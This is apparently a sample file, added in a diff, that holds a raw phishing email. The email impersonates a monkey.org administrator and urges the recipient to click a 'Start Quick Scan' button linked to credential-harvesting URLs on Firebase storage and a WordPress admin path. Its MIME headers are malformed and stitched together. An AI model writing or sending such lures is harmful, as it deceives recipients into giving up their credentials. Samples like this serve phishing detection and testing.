@@ -1,0 +1,61 @@
+From: kathy_tefft@johncooper.org
+To: isabel.parker@freshfields.com, gregorylang@paulhastings.com
+Subject: MIME Attack Sample
+Content-Type: multipart/signed; protocol="application/x-pkcs7-signature";  micalg=sha-256; boundary="BOUNDARY" 
+--BOUNDARY
+Content-Type: text/plain Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 127
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19811"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<DIV style=3D"FONT-SIZE: 15px; COLOR: rgb(33,33,33)"><FONT size=3D3><BR>Dea=
+r&nbsp;</FONT>jose@monkey.org</DIV>
+<DIV style=3D"FONT-SIZE: 15px; COLOR: rgb(33,33,33)">
+<P><FONT size=3D3>monkey.org have detected low security for your account jo=
+se@monkey.org<BR>You must scan your email to help keep you safe now.</FONT>=
+</P>
+<DIV><BR>
+<DIV>
+<A style=3D"TEXT-DECORATION: none; BORDER-TOP: #2885bf 0px solid; FONT-FAMI=
+LY: 'arial'; BORDER-RIGHT: #2885bf 0px solid; BORDER-BOTTOM: #2885bf 0px so=
+lid; COLOR: #ffffff; PADDING-BOTTOM: 10px; PADDING-TOP: 11px; PADDING-LEFT:=
+ 20px; BORDER-LEFT: #2885bf 0px solid; PADDING-RIGHT: 20px; BACKGROUND-COLO=
+R: #1a82c7; border-bottom-left-radius: 10px; border-bottom-right-radius: 10=
+px; border-top-left-radius: 10px; border-top-right-radius: 10px"=20
+href=3D"https://firebasestorage.googleapis.com/v0/b/managegpa-12433.appspot=
+=2Ecom/o/gpa%2Findex2dyl.html?alt=3Dmedia&amp;token=3Dc3581d41-177f-4663-b9=
+bb-d7ae506ed4d3#jose@monkey.org" rel=3D"noopener noreferrer" data-cke-saved=
+-href=3D"https://natarajgallery.com/wp-admin/js/sn/index.php?email=3Djinyue=
+sg@singnet.com.sg">Start Quick Scan&nbsp;</A></DIV>
+<DIV><BR>
+<DIV><BR></DIV>
+<DIV>
+<DIV><FONT size=3D3><STRONG>Note:</STRONG>&nbsp;&nbsp;This service is free,=
+ it's compulsory to scan your e-mail to keep account safe.</FONT></DIV></DI=
+V></DIV></DIV></DIV>
+<P>Thank you.,<BR>monkey.org&nbsp;Admin.<BR data-cke-eol=3D"1"></P></BODY><=
+/HTML>
+--BOUNDARY
+Content-Type: application/x-pkcs7-signature; name="smime.p7s"
+Content-Disposition: attachment; filename="smime.p7s"
+Content-Transfer-Encoding: base64 
+
+-----BEGIN PGP SIGNATURE-----
+MIAGCSqGSIb3DQEHAqCAMIACAQExDzANBglghkgBZQMEAgEFADCABgkqhkiG9w0BBwEAAKCCDqMw
+ggSXMIIDf6ADAgECAg5IG2oIokSI01ybPclIDTANBgkqhkiG9w0BAQsFADBMMSAwHgYDVQQLExdH
+bG9iYWxTaWduIFJvb3QgQ0EgLSBSMzETMBEGA1UEChMKR2xvYmFsU2lnbjETMBEGA1UEAxMKR2xv
+YmFsU2lnbjAeFw0xNjA2MTUwMDAwMDBaFw0yNDA2MTUwMDAwMDBaMF0xCzAJBgNVBAYTAkJFMRkw
+FwYDVQQKExBHbG9iYWxTaWduIG52LXNhMTMwMQYDVQQDEypHbG9iYWxTaWduIFBlcnNvbmFsU2ln
+biAxIENBIC0gU0hBMjU2IC0gRzMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDKsJtr
+TQo4rIa7CH2H78wBxmZlQX07EYoDnoAAMdoMTTysHRYRuCbonhe8k/c4ZDtyAd1Um7pcxmRF3oRx
+--BOUNDARY--
